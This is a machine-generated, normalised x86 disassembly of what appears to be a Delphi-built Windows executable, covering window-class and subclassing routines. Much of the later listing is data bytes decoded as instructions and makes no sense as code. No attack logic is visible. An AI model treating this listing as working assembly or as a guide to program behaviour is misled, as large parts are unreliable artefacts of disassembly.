test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1b0
mov eax [ rw-data ]
call sub_413b7c
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4137ac
call sub_403258
inc esi
dec ebx
jne r-xdata
sub_41a1c8
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41a1f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028b8
mov edx sub_41a1c8
lea eax [ esi + 0x5 ]
call sub_41a1e8
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41a1e8
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41a2ac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_4068e4
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a1f0
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41a360
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41a288
sub_41a388
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a42c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a433
retn
mov eax [ rw-data ]
call sub_412f9c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41a154
xor edx edx
xor eax eax
call sub_416370
mov eax rw-data
call sub_40cb64
call sub_405cfc
lea eax [ eax + 0xc ]
call sub_40cb64
mov eax rw-data
call sub_40cb64
mov eax rw-data
call sub_4055cc
mov eax sub_41a1c0
call sub_405468
mov eax rw-data
call sub_40cb64
call sub_418f6c
mov eax rw-data
call sub_40cb64
mov eax rw-data
call sub_4055cc
sub_41a438
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a4c1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4c8
retn
call sub_418f38
mov eax sub_41a1c0
call sub_405460
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c8a4
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4055e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_412898
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4139c0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4139c0
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41a4cc
xchg esi eax
inc esi
add [ eax + 0x640000ff ] cl
xchg esi eax
inc esi
add [ ecx + 0x640000ff ] cl
xchg esi eax
inc esi
add [ edx + 0x640000ff ] cl
xchg esi eax
inc esi
add [ ebx + 0x640000ff ] cl
xchg esi eax
inc esi
add [ edi + edi * 8 - 0x699c0000 ] cl
inc esi
add [ ebp + 0x640000ff ] cl
xchg esi eax
inc esi
add [ esi + 0x640000ff ] cl
xchg esi eax
inc esi
add [ edi + 0x640000ff ] cl
xchg esi eax
inc esi
add [ eax - 0x1 ] dh
add [ eax ] al
xchg esi eax
inc esi
add [ ecx - 0x1 ] dh
add [ eax ] al
xchg esi eax
inc esi
add [ edx - 0x1 ] dh
add [ eax ] al
xchg esi eax
inc esi
add [ ebx - 0x1 ] dh
add [ eax ] al
xchg esi eax
inc esi
add [ edi + edi * 8 ] dh
add [ esi + edx * 4 + 0x46 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
xchg esi eax
inc esi
add [ esi - 0x1 ] dh
add [ eax ] al
xchg esi eax
inc esi
add [ edi - 0x1 ] dh
add [ eax ] al
xchg esi eax
inc esi
add [ eax - 0x1 ] bh
add [ eax ] al
xchg esi eax
inc esi
add [ ecx - 0x1 ] bh
add [ eax ] al
xchg esi eax
inc esi
add [ edx - 0x1 ] bh
add [ eax ] al
xchg esi eax
inc esi
add [ ebx - 0x1 ] bh
add [ eax ] al
xchg esi eax
inc esi
add [ edi + edi * 8 ] bh
add [ esi + edx * 4 + 0x46 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
xchg esi eax
inc esi
add [ esi - 0x1 ] bh
add [ eax ] al
xchg esi eax
inc esi
add [ edi - 0x1 ] bh
add [ eax ] al
xchg esi eax
inc esi
add [ eax - 0x1 ] ah
add [ eax ] al
xchg esi eax
inc esi
add [ ecx - 0x1 ] ah
add [ eax ] al
xchg esi eax
inc esi
add [ edx - 0x1 ] ah
add [ eax ] al
xchg esi eax
inc esi
add [ ebx - 0x1 ] ah
add [ eax ] al
xchg esi eax
inc esi
add [ edi + edi * 8 ] ah
add [ esi + edx * 4 + 0x46 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
xchg esi eax
inc esi
add [ esi - 0x1 ] ah
add [ eax ] al
xchg esi eax
inc esi
add [ edi - 0x1 ] ah
add [ eax ] al
xchg esi eax
inc esi
add [ eax - 0x1 ] ch
add [ eax ] al
xchg esi eax
inc esi
add [ ecx - 0x1 ] ch
add [ eax ] al
xchg esi eax
inc esi
add [ edx - 0x1 ] ch
add [ eax ] al
xchg esi eax
inc esi
add [ ebx - 0x1 ] ch
add [ eax ] al
xchg esi eax
inc esi
add [ edi + edi * 8 ] ch
add [ esi + edx * 4 + 0x46 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
xchg esi eax
inc esi
add [ esi - 0x1 ] ch
add [ eax ] al
xchg esi eax
inc esi
add [ edi - 0x1 ] ch
add [ eax ] al
xchg esi eax
inc esi
add [ eax - 0x1 ] dl
add [ eax ] al
xchg esi eax
inc esi
add [ ecx - 0x1 ] dl
add [ eax ] al
xchg esi eax
inc esi
add [ edx - 0x1 ] dl
add [ eax ] al
xchg esi eax
inc esi
add [ ebx - 0x1 ] dl
add [ eax ] al
xchg esi eax
inc esi
add [ edi + edi * 8 ] dl
add [ esi + edx * 4 + 0x46 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
xchg esi eax
inc esi
add [ esi - 0x1 ] dl
add [ eax ] al
xchg esi eax
inc esi
add [ edi - 0x1 ] dl
add [ eax ] al
xchg esi eax
inc esi
add [ eax - 0x1 ] bl
add [ eax ] al
xchg esi eax
inc esi
add [ ecx - 0x1 ] bl
add [ eax ] al
xchg esi eax
inc esi
add [ edx - 0x1 ] bl
add [ eax ] al
xchg esi eax
inc esi
add [ ebx - 0x1 ] bl
add [ eax ] al
xchg esi eax
inc esi
add [ edi + edi * 8 ] bl
add [ esi + edx * 4 + 0x46 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
xchg esi eax
inc esi
add [ esi - 0x1 ] bl
add [ eax ] al
xchg esi eax
inc esi
add [ edi - 0x1 ] bl
add [ eax ] al
xchg esi eax
inc esi
add [ eax - 0x1 ] al
add [ eax ] al
xchg esi eax
inc esi
add [ ecx - 0x1 ] al
add [ eax ] al
xchg esi eax
inc esi
add [ edx - 0x1 ] al
add [ eax ] al
xchg esi eax
inc esi
add [ ebx - 0x1 ] al
add [ eax ] al
xchg esi eax
inc esi
add [ edi + edi * 8 ] al
add [ esi + edx * 4 + 0x46 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
xchg esi eax
inc esi
add [ esi - 0x1 ] al
add [ eax ] al
xchg esi eax
inc esi
add [ edi - 0x1 ] al
add [ eax ] al
xchg esi eax
inc esi
add [ eax - 0x1 ] cl
add [ eax ] al
xchg esi eax
inc esi
add [ ecx - 0x1 ] cl
add [ eax ] al
xchg esi eax
inc esi
add [ edx - 0x1 ] cl
add [ eax ] al
xchg esi eax
inc esi
add [ ebx - 0x1 ] cl
add [ eax ] al
xchg esi eax
inc esi
add [ edi + edi * 8 ] cl
add [ esi + edx * 4 + 0x46 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
xchg esi eax
inc esi
add [ esi - 0x1 ] cl
add [ eax ] al
xchg esi eax
inc esi
add [ edi - 0x1 ] cl
add [ eax ] al
xchg esi eax
inc esi
add [ eax ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
xchg esi eax
inc esi
add [ 0x640000ff ] dh
xchg esi eax
inc esi
add [ esi ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x46 ] ah
add [ ebx ] bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41a791
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a798
retn
sub_41a7a4
test al 0xa7
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
or [ eax + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0xc0041 ] ch
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + ebp * 4 + 0x41 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 4 + 0x41 ] ah
add [ eax + eax ] cl
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
inc esi
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
test [ eax + 0xa030041 ] ch
push esp
inc esi
outsd
outsb
je r-xdata
jae r-xdata
popad
insd
nop
fsubr [ eax + 0xc010041 ]
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
hlt
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + 0x90041a8 ] al
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add al al
test eax 0x70070041
insd
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
test al 0x41
add [ ebx + 0x41a95cc0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
test al 0x41
add [ esi ] al
jae r-xdata
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xa944c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax - 0x57 ] bl
inc ecx
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
insb
stosd [ edi ]
inc ecx
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41a9c490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x55 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x41 ] ch
jae r-xdata
rol [ eax + 0x30041aa ] 0xb
push esp
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
popad
jb r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
or [ edi + 0x72 ] al
popad
jo r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ edx + ebp * 4 + 0x41 ] bh
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41a8c890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
inc edi
jb r-xdata
mov ebp 0x540f0041
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
inc edx
jb r-xdata
mov eax eax
sub [ edx + 0xb030041 ] 0x54
inc edi
jb r-xdata
add [ eax ] al
xchg esp eax
stosd [ edi ]
inc ecx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
dec [ eax + eax * 8 + 0x54050041 ]
inc esi
outsd
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
sbb [ ecx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 ] ah
inc ecx
add [ eax - 0x54 ] cl
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ebp * 2 - 0x55 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ edi + 0x3e340041 ] ah
inc ecx
add [ esi + edi ] bh
inc ecx
add [ eax + 0x3d ] dl
inc ecx
inc eax
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ebp + edx + 0x41 ] dl
jpe r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
call [ ebp + edi * 4 + 0x41 ]
add [ edi ] cl
push esp
jo r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
inc ecx
push 0x6c797453
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
nop
inc edi
inc esp
stosd [ edi ]
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xaa80c08b
inc ecx
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
jmp esp
lodsb [ esi ]
inc ecx
add [ edi ] al
add eax 0x6e6f4654
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
lodsb [ esi ]
inc ecx
add [ esi ] bh
lodsb [ esi ]
inc ecx
add [ eax + eax ] ah
add [ eax ] al
clc
dec eax
lodsb [ esi ]
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + eax * 2 - 0x55 ] si
inc ecx
add al cl
adc eax 0x41
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
inc ecx
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
imul esp [ ebx + 0x73 ] 0x41ab4490
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
or al 0xc5
inc ecx
add [ eax * 8 + 0x10041 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
lodsb [ esi ]
inc ecx
add [ eax - 0x55 ] ch
inc ecx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
stosb [ edi ]
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
imul esp [ ebx + 0x73 ] 0xc08b0000
cwde
stosd [ edi ]
inc ecx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
add [ eax - 0x55 ] bl
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ eax ] al
add [ ebx + ebp * 4 + 0x200041 ] dl
add [ eax ] al
add [ eax ] eax
std
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] bl
add [ eax ] al
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x41a8c474
add ah dh
retn
jo r-xdata
inc eax
add [ eax + eax * 8 + 0x41 ] ah
add [ esi + edi ] dh
inc ecx
add [ esi + edi ] bh
inc ecx
add [ eax + 0xe0041c0 ] ch
inc eax
add [ edx + esi ] cl
imul sp [ ebp + 0x72 ] 0x1114
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
les ebp [ eax - 0x3c0bffbf ]
inc ecx
add [ esp + eax * 8 ] cl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
sub [ gs : eax - 0x3b23ffbf ] 0x41
add ah ah
les eax [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
push 0x840041c4
les eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69530400
jpe r-xdata
push 0x65737261
je r-xdata
imul esp [ ebx + 0x73 ] 0xa8d40007
inc ecx
add [ eax * 8 - 0x3aebffbf ] cl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ esi ] cl
jo r-xdata
inc eax
add [ edx + esi ] cl
inc eax
test eax 0xc4a40041
inc ecx
add [ eax + 0x10041c4 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
aam 0xc7
inc ecx
add ah bl
mov [ ecx ] 0x1
imul esp [ ebx + 0x73 ] 0xa7a40004
inc ecx
add al cl
mov [ ecx ] 0xd0
mov [ ecx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc eax
add [ eax + 0x340041c5 ] al
inc ecx
add [ esi + edi ] bh
inc ecx
add [ eax + 0x40041c5 ] ch
push esp
push eax
outsb
lea eax [ eax ]
insb
lea eax [ eax ]
xchg esp eax
lodsd [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 4 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1c0041ad ]
add [ eax ] al
add al bh
stosb [ edi ]
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
add [ eax ] al
jae r-xdata
lodsb [ esi ]
lodsd [ esi ]
inc ecx
add [ edi ] al
add al 0x54
push eax
outsb
xchg esp eax
lodsd [ esi ]
inc ecx
add [ eax - 0x55 ] ch
inc ecx
add [ eax + eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax [ eax ]
add eax 0x74646957
push 0xae94c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x180041ae ]
add [ eax ] al
add al bh
stosb [ edi ]
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x38 ] cl
inc ecx
add [ esi + edi ] dh
inc ecx
add [ esi + edi ] bh
inc ecx
add [ eax - 0x38 ] dh
inc ecx
add [ esi ] al
push esp
inc edx
jb r-xdata
test eax 0x180041
add bh bh
nop
mov [ ecx ] 0x1
add [ eax ] al
add [ eax + 0x4 ] al
add [ eax ] eax
add al 0x4d
outsd
pop eax
test eax 0xc7a40041
inc ecx
add [ edi + eax * 8 + 0x10041 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add ah dl
mov [ ecx ] sub_41c7dc
add [ eax ] eax
add [ eax ] al
test al 0xc9
inc ecx
add [ eax + 0x10041c9 ] dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 + 0x41 ] bh
nop
lodsb [ esi ]
scasb [ edi ]
inc ecx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
inc ecx
add [ eax - 0x4bffbe2b ] al
aam 0x41
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
stosb [ edi ]
inc ecx
add ah al
0x41
add [ eax ] al
add [ eax ] al
add [ eax - 0x51 ] dh
jae r-xdata
jns r-xdata
jae r-xdata
jl r-xdata
xchg esp eax
scasb [ edi ]
inc ecx
add [ eax - 0x55 ] ch
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
add al 0x24
retn
outsd
inc esp
add al [ eax ]
add al 0x46
outsd
outsb
je r-xdata
scasd [ edi ]
inc ecx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
lodsd [ esi ]
inc ecx
add [ eax ] dl
add [ eax ] al
[ eax - 0x2d ]
pop eax
rol [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jae r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebx + 0x73 ] 0xa7a40002
inc ecx
add [ eax - 0x4fffbe37 ] ch
leave
inc ecx
add [ ecx ] al
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
lodsb [ esi ]
inc ecx
add [ eax + eax ] cl
add bh bh
scasd [ edi ]
inc ecx
add al cl
adc eax 0x40041
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ eax ] bl
add [ eax ] al
push esp
adc eax 0x34880041
inc eax
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add ah al

add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
imul esp [ ebx + 0x73 ] 0xaea80004
inc ecx
add [ eax + eax ] dl
add bh bh
je r-xdata
inc ecx
sub_41b094
outsb
mov al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4f ] bl
inc ecx
add [ eax ] al
